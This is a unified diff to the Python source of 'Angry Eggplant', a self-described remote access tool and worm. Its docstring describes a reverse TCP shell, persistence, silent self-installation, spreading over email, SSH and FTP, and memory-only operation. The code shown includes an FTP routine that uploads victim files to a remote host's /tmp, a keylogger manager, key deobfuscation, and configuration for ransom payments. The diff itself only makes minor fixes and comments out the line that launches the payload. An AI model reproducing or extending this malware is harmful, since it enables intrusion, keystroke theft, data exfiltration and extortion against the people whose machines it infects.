@@ -102,27 +102,28 @@ def config(*arg, **options):
 
 
 
-class Client():
+class Client(object):
+
 
     """
 
     THE ANGRY EGGPLANT PROJECT
 
-         Angry Eggplant primarily acts as a remote access tool inspired by the
+             Angry Eggplant primarily acts as a remote access tool inspired by the
          Meterpreter shell of the Metasploit Project, with some major improvements.
          It is ultra-portable - it is written in pure python, has zero dependencies,
          runs on anything, requires no manual configuration, and does not require
-         any downloads or installations to run - in fact, if it can't find something
-         it needs, rather than raise an error or fail to run, it automatically
-         downloads/installs it silently without any user interaction. This is
-         convenient for the remote access tool, but the true power of this is in
-         the autonomous mode which transforms the client from a reverse tcp shell
-         loaded with many payloads into something more closely resembling a worm
-         than a remote access tool. Operating in this mode it autonomously discovers
-         and analyzes hosts to then generate, configure, and compile a unique
-         encrypted deliverable for each target which acts as a stager that gains a
-         foothold and acts a stager from which to download and execute the main client
-         from. The client first establishes persistence with multiple methods to ensure
+         any downloads or installations to run.
+             It dynamically downloads, installs, and configures it silently in the
+         background, without any user interaction. This is convenient for the
+         remote access tool, but the true power of this is in the autonomous mode
+         which transforms the client from a reverse tcp shell loaded with many
+         payloads into something more closely resembling a worm than a remote access
+         tool. Operating in this mode it autonomously discovers and analyzes hosts
+         to then generate, configure, and compile a unique encrypted deliverable for
+         each target, with the purpose of acting as a stager from which the payload, the main client, is downloaded and executed.
+
+             The client first establishes persistence with multiple methods to ensure
          redundancy. Next it seeks to discover new host machines in its local network,
          and spread itstelf to those hosts using mulitiple payload delivery vectors,
          such as email, ssh, and ftp. It does all this from memory without leaving a
@@ -141,7 +142,7 @@ class Client():
 
             - End-to-end encryption
 
-            - Runs on Windows, Mac OS X, iOS, Linux (Android support coming soon)
+            - Runs on Windows, Mac OS X, Linux (Android support coming soon)
 
             _ Automated host discovery
 
@@ -159,6 +160,7 @@ class Client():
 
 
     """
+
 
     __name__    = 'Client'
     _tasks      = Queue.Queue()
@@ -180,7 +182,6 @@ class Client():
 
     @staticmethod
     def _configure(target, **kwargs):
-        Client.debug(json.dumps(kwargs, indent=2))
         if hasattr(Client, target):
             for k,v in kwargs.items():
                 try:
@@ -575,9 +576,9 @@ class Client():
         try:
             path  = ''
             local = time.ctime().split()
-            if os.path.isfile(source):
+            if os.path.isfile(str(source)):
                 path   = source
-                source = open(source, 'rb')
+                source = open(str(path), 'rb')
             elif hasattr(source, 'seek'):
                 source.seek(0)
             else:
@@ -589,7 +590,7 @@ class Client():
             if addr not in host.nlst('/tmp'):
                 host.mkd('/tmp/{}'.format(addr))
             if path:
-                path = '/tmp/{}/{}'.format(addr, path)
+                path = '/tmp/{}/{}'.format(addr, os.path.basename(path))
             else:
                 if filetype:
                     filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
@@ -658,7 +659,7 @@ class Client():
                 else:
                     time.sleep(5)
         except Exception as e:
-            self.debug("{} returned error: {}".format(manager.func_name, str(e)))
+            self.debug("{} returned error: {}".format(self._keylogger_manager.func_name, str(e)))
 
 
     def _keylogger_event(self, event):
@@ -1359,11 +1360,6 @@ class Client():
         if not key:
             key = self._deobfuscate(self._session['key'])
         return getattr(self, '_decrypt_{}'.format(self._info['encryption']))(data, key)
-
-
-
-    # Commands
-
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
@@ -2115,7 +2111,7 @@ def main(*args, **kwargs):
             Client._configure('_ransom_payment', account_id=ransom_account_id, client_id=ransom_client_id, client_secret=ransom_client_secret)
     finally:
         payload = Client(**kwargs)
-        payload.run() if not Client._debug else payload.run(host='127.0.0.1', port=1337)
+#        payload.run() if not Client._debug else payload.run(host='127.0.0.1', port=1337)
         return payload
 
 
